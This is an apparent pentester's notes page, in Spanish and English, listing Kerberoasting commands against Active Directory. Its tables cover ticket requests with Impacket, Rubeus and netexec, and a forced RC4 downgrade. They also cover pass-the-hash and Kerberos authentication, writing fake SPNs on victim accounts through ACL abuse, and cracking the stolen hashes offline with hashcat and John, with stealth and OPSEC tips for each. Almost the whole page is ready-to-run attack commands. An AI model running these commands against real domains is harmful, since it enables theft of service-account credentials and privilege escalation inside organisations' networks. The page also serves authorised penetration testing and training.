---
aliases:
  - Kerberoasting Tooling
  - Rubeus
  - GetUserSPNs
  - hashcat 13100
tags:
  - type/tool
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Kerberoasting]]'
  - '[[netexec]]'
  - '[[Impacket Toolkit]]'
---
# Kerberoasting - Tooling

***

## Impacket-GetUserSPNs (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC>` | Enum SPNs (sin roast) | Recon. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -outputfile h.txt` | Bulk roast | Standard Linux. |
| `impacket-GetUserSPNs corp.local/u -hashes :<NT> -dc-ip <DC> -request` | PtH auth | Sin password. |
| `impacket-GetUserSPNs corp.local/u -aesKey <AES> -dc-ip <DC> -request` | AES auth | OPSEC. |
| `impacket-GetUserSPNs corp.local/u -k -no-pass -dc-ip <DC> -request` | Kerberos (con TGT) | OPSEC + post-overpass. |
| `impacket-GetUserSPNs corp.local/u:p -target-domain partner.com -dc-ip <DC> -request` | Cross-domain | Cross-trust. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -user <single>` | Targeted single user | Stealth. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request -usersfile users.txt` | Multiple from file | Targeted bulk. |
^kerb-tool-impacket

___

## Rubeus (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe kerberoast /outfile:hashes.txt` | Bulk roast all | Standard. |
| `Rubeus.exe kerberoast /user:<svc> /outfile:single.txt` | Targeted single | Stealth. |
| `Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local /outfile:sql.txt` | Specific SPN | Edge. |
| `Rubeus.exe kerberoast /aes /outfile:aes.txt` | Solo AES tickets | OPSEC. |
| `Rubeus.exe kerberoast /rc4opsec /outfile:rc4.txt` | Filter accounts soportando RC4 (no force) | Stealth crack-friendly. |
| `Rubeus.exe kerberoast /tgtdeleg /outfile:rc4_force.txt` | Force RC4 via TGT delegation (loud) | Downgrade attack. |
| `Rubeus.exe kerberoast /domain:partner.com /outfile:cross.txt` | Cross-domain | Cross-trust. |
| `Rubeus.exe kerberoast /ticket:<base64-TGT> /outfile:h.txt` | Use existing TGT | Post-PtT. |
| `Rubeus.exe kerberoast /format:hashcat /outfile:h.txt` | Hashcat format (default) | Standard. |
| `Rubeus.exe kerberoast /format:john /outfile:h.txt` | John format | Alt cracker. |
^kerb-tool-rubeus

___

## netexec / crackmapexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --kerberoasting roast.hash` | Bulk enum + roast | Quick all-in-one. |
| `nxc ldap <DC> -u u -H <NT> --kerberoasting roast.hash` | PtH auth | Sin password. |
| `nxc ldap <DC> -u u -p p -k --kerberoasting roast.hash` | Kerberos auth | OPSEC. |
| `nxc ldap <DC> -u 'corp\u' -p pass --kerberoasting cross.hash --kdcHost <foreign-DC>` | Cross-domain | Cross-trust. |
^kerb-tool-nxc

___

## targetedKerberoast.py

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 targetedKerberoast.py -d corp.local -u u -p pass --dc-ip <DC>` | Auto write SPN + roast + cleanup | Targeted ACL abuse. |
| `python3 targetedKerberoast.py -d corp.local -u u -p pass --request-user <victim>` | Specific victim | Per-user. |
| `python3 targetedKerberoast.py -d corp.local -u u --no-pass -k -dc-ip <DC>` | Kerberos auth | OPSEC. |
^kerb-tool-targeted

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast/targetedKerberoast.py -d corp.local -u atacante -p 'Pass!' --dc-ip <DC>
```

___

## hashcat

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 13100 hashes.txt rockyou.txt -O` | RC4 crack standard | Default. |
| `hashcat -m 19700 hashes.txt rockyou.txt -O` | AES256 crack | Modern. |
| `hashcat -m 19600 hashes.txt rockyou.txt -O` | AES128 crack | Modern. |
| `hashcat -m 13100 h.txt rockyou.txt -r best64.rule -O` | + best64 rules | Common variations. |
| `hashcat -m 13100 h.txt rockyou.txt -r OneRuleToRuleThemAll.rule -O` | Comprehensive rules | Hard targets. |
| `hashcat -m 13100 h.txt -a 3 ?u?l?l?l?d?d?d?d?s` | Mask attack | Targeted pattern. |
| `hashcat -m 13100 h.txt -a 6 rockyou.txt ?d?d?d?s` | Hybrid wordlist + mask suffix | Year/symbol patterns. |
| `hashcat -m 13100 h.txt --show` | Show cracked | Post-run. |
^kerb-tool-hashcat

___

## John the Ripper

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `john --format=krb5tgs --wordlist=rockyou.txt h.txt` | RC4 crack | Standard alt. |
| `john --format=krb5tgs-aes hashes.txt --wordlist=rockyou.txt` | AES crack | Modern. |
| `john --format=krb5tgs h.txt --rules=Best64 --wordlist=rockyou.txt` | + rules | Comprehensive. |
| `john --format=krb5tgs --show h.txt` | Show cracked | Post-run. |
^kerb-tool-john

___

## bloodyAD (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass set object <victim> servicePrincipalName -v 'HTTP/fake'` | Set SPN (targeted setup) | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove object <victim> servicePrincipalName -v 'HTTP/fake'` | Clear SPN | Cleanup. |
| `bloodyAD --host <DC> -d corp -u u -p pass get search "(servicePrincipalName=*)" --attr samAccountName,servicePrincipalName` | Enum SPNs Linux | Recon. |
^kerb-tool-bloodyad

___

## BloodHound Custom Queries

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name,u.serviceprincipalnames` | All kerberoastable | Standard. |
| `MATCH (u:User {hasspn:true}) WHERE u.adminCount = true RETURN u.name,u.serviceprincipalnames` | Priv kerberoastable | Critical. |
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t:User) WHERE NOT t.hasspn RETURN p` | Targeted candidates | Targeted ACL hunt. |
^kerb-tool-bh

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| HackTricks Kerberoasting | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast` |
| The Hacker Recipes — Kerberoast | `https://www.thehacker.recipes/ad/movement/kerberos/kerberoast` |
| HarmJ0y — Kerberoasting (foundational) | `https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/` |
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| Impacket | `https://github.com/fortra/impacket` |
| targetedKerberoast | `https://github.com/ShutdownRepo/targetedKerberoast` |
| Hashcat modes reference | `https://hashcat.net/wiki/doku.php?id=example_hashes` |
| OneRuleToRuleThemAll | `https://github.com/NotSoSecure/password_cracking_rules` |
| MITRE ATT&CK T1558.003 | `https://attack.mitre.org/techniques/T1558/003/` |
^kerb-tool-resources

***
